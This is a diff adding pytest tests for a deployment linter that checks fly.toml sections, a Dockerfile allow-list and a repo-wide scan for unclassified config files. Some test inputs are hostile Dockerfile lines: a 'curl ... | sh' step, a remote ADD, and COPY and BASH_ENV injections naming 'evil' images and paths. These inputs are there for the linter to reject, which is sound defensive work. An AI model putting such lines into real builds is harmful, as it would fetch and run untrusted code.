@@ -1066,3 +1066,96 @@ def test_roster_consumer_found_by_image_name(tmp_path):
     base = C_BASE.replace("    command: delegation serve --host 0.0.0.0 --port 8003\n", "    image: ghcr.io/x/delegation-authority:1\n").replace("  delegation:", "  authority:")
     reports, _, _ = run(_c_tree(tmp_path, base=base))
     assert status(reports, "gb10", "FIELD_DOA_ROSTER") == lint.ARMED
+
+
+# --- second review, group 4: fly.toml sections, Dockerfile allow-list, repo-wide scan --
+
+def _fly_toml(tmp_path, toml):
+    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, toml=toml)
+    _, errors, _ = run(root)
+    return [e for e in errors if e.startswith("FAIL fly")]
+
+
+@pytest.mark.parametrize("toml,needle", [
+    ("[env]\n[experimental]\ncmd = ['x']\n", "experimental"),
+    ("[env]\n[processes]\napp = 'x'\n", "processes"),
+    ("[env]\n[[services]]\ninternal_port = 1\n", "services"),
+    ("[env]\n[deploy]\nrelease_command = 'x'\n", "deploy"),
+    ("[env]\n[build]\nimage = 'evil:1'\n", "image"),
+    ("[env]\n[build]\nbuilder = 'paketobuildpacks/builder'\n", "builder"),
+])
+def test_unknown_fly_toml_sections_and_non_dockerfile_builds_are_findings(tmp_path, toml, needle):
+    fly = _fly_toml(tmp_path, toml)
+    assert fly and any("fly.toml" in e and needle in e for e in fly), fly
+
+
+def test_the_known_fly_toml_sections_are_accepted(tmp_path):
+    toml = ('app = "x"\nprimary_region = "yyz"\n[build]\ndockerfile = "Dockerfile"\n[env]\nA = "1"\n'
+            '[http_service]\ninternal_port = 8080\n[[http_service.checks]]\npath = "/"\n[[mounts]]\nsource = "d"\n[[vm]]\nsize = "s"\n')
+    assert _fly_toml(tmp_path, toml) == []
+
+
+@pytest.mark.parametrize("dockerfile", [
+    DOCKERFILE_OK.replace("COPY integration/fly/entrypoint.sh /entrypoint.sh", 'COPY ["integration/fly/entrypoint.sh", "/entrypoint.sh"]'),
+    DOCKERFILE_OK + "RUN sed -i 's/\\r$//' /entrypoint.sh\n",
+    DOCKERFILE_OK + "COPY --from=caddy:2-alpine /usr/bin/caddy /usr/bin/caddy\n",
+    DOCKERFILE_OK + "WORKDIR /platform\nRUN pip install --no-cache-dir \\n    ./a \\n    ./b\nEXPOSE 8080\nARG FIELD_BUILD_SHA=unknown\n",
+])
+def test_known_good_dockerfile_forms_are_not_findings(tmp_path, dockerfile):
+    _, fly = _fly_findings(tmp_path, dockerfile=dockerfile)
+    assert fly == [], fly
+
+
+@pytest.mark.parametrize("extra,needle", [
+    ("FROM python:3.12-slim\n", "FROM"),
+    ("ADD https://example.com/x.tar /opt/\n", "ADD"),
+    ("COPY --from=evil:1 /a /b\n", "--from"),
+    ("COPY integration/fly/ /\n", "COPY"),
+    ("ENV BASH_ENV=/etc/evil\n", "BASH_ENV"),
+    ("RUN curl -s https://example.com/x | sh\n", "RUN"),
+    ('SHELL ["/bin/sh", "-c"]\n', "SHELL"),
+    ("ONBUILD RUN true\n", "ONBUILD"),
+])
+def test_dockerfile_allow_list_rejects_the_rest(tmp_path, extra, needle):
+    _, fly = _fly_findings(tmp_path, dockerfile=DOCKERFILE_OK + extra)
+    assert fly and any("Dockerfile" in e and needle in e for e in fly), fly
+
+
+@pytest.mark.parametrize("rel,body", [
+    ("deploy/stack.yml", "services:\n  a:\n    image: x\n"),
+    (".deploy/compose.yaml", "services:\n  a:\n    image: x\n"),
+    ("ops/app.toml", "[http_service]\ninternal_port = 1\n"),
+    ("ops/fly.prod.toml", "[build]\ndockerfile = 'x'\n"),
+    ("ops/Dockerfile.prod", "FROM x\n"),
+    ("ops/start.sh", "export FIELD_SHARED_SECRET=\n"),
+])
+def test_unclassified_files_anywhere_in_the_repo_fail(tmp_path, rel, body):
+    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
+    _, errors, _ = run(root)
+    assert any(e.startswith("unclassified descriptor") and rel in e for e in errors), errors
+
+
+@pytest.mark.parametrize("rel,body", [
+    ("ops/start.sh", "echo hello\n"),                                  # a script that mentions neither variable
+    ("node_modules/x/docker-compose.yml", "services:\n  a:\n    image: x\n"),
+    (".git/hooks/compose.yml", "services:\n  a:\n    image: x\n"),
+    (".github/workflows/ci.yml", "jobs:\n  t:\n    runs-on: x\n"),
+    ("pyproject.toml", "[build-system]\nrequires = []\n"),
+])
+def test_unrelated_files_are_not_flagged(tmp_path, rel, body):
+    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED, extra={rel: body})
+    _, errors, _ = run(root)
+    assert errors == [], errors
+
+
+def test_reviewed_files_that_must_stay_clean_are_checked(tmp_path):
+    assert lint.reviewed_file_problems(REPO) == []
+    (tmp_path / "integration/demo").mkdir(parents=True)
+    (tmp_path / "integration/demo/Dockerfile").write_text("FROM x\nENV FIELD_SHARED_SECRET=abc\n", encoding="utf-8")
+    assert lint.reviewed_file_problems(tmp_path) and "integration/demo/Dockerfile" in lint.reviewed_file_problems(tmp_path)[0]
+
+
+def test_cli_fails_when_a_reviewed_clean_file_starts_mentioning_a_variable(tmp_path):
+    root = make_tree(tmp_path, gb10=GB10_ARMED, entry=ENTRY_ARMED,
+                     extra={"integration/demo/Dockerfile": "FROM x\nENV FIELD_SHARED_SECRET=abc\n"})
+    assert lint.main(["--root", str(root), "--today", "2026-10-23"]) == 1
